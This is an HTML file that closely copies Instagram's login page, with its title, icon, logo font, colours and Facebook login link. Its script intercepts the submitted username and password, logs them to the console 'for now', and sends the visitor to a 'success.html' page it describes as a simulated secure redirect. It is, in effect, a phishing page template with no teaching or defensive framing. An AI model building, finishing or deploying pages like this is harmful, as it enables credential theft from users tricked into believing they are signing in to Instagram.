<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>

  <!-- Favicon -->
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">

  <!-- Font for Instagram title -->
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #fafafa;
    }

    .container {
      width: 100%;
      max-width: 350px;
      margin: 60px auto;
      padding: 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .instagram-name {
      font-family: 'Grand Hotel', cursive;
      font-size: 45px;
      margin-bottom: 30px;
      color: #262626;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 5px 0 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }

    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .divider hr {
      flex: 1;
      border: none;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 13px;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      margin: 10px 0;
      text-decoration: none;
    }

    .forgot-password {
      font-size: 12px;
      color: #00376b;
      margin-top: 15px;
      display: block;
      text-decoration: none;
    }

    .signup-box {
      margin: 20px auto;
      text-align: center;
      padding: 20px;
      border: 1px solid #dbdbdb;
      background-color: #fff;
    }

    .signup-box a {
      text-decoration: none;
      color: #3897f0;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="instagram-name">Instagram</div>

    <form method="POST" action="/login" id="login-form">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="divider">
      <hr><span>OR</span><hr>
    </div>

    <a class="facebook-login" href="#">Log in with Facebook</a>
    <a class="forgot-password" href="#">Forgot password?</a>
  </div>

  <div class="signup-box">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault(); // prevent real submission

      const username = document.querySelector('input[name="username"]').value;
      const password = document.querySelector('input[name="password"]').value;

      // Log details to console for now
      console.log("Username:", username);
      console.log("Password:", password);

      // Simulate secure redirect
      window.location.href = "success.html";
    });
  </script>

</body>
</html>
